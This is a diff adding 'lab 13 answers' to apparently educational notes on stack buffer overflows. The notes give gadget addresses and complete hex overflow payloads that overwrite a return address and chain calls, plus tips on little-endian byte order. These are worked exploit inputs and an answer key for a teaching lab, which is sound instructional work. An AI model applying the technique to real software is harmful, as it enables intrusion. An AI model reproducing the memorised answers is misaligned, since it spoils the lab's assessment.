@@ -998,3 +998,10 @@ Essential idea
 `2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 95 11 40 00 00 00 00 ef be ad de 00 00 00 00 91 11 40 00 00 00 00 71 11 40 00 00 00 00`
 
 stack return address with data to get it to do what you want.
+
+## lab 13 answers
+1. 0x72244f
+2. 2a 2a 2a 2a 2a 2a 2a 2a  5b 24 72 00 00 00 00 00 44 22 44 22 44 22 44 22 88 77 66 55 44 33 22 11
+3. 0x72243d, 0x72244c
+4. 2a 2a 2a 2a 2a 2a 2a 2a 3d 24 72 00 00 00 00 00 24 42 22 00 00 00 00 00 4c 24 72 00 00 00 00 00 11 22 33 44 55 66 77 88
+**All values are backwards including input.** Also, Do not forget the zeros. You can put a newline every 8 bytes which will make it easier to read.
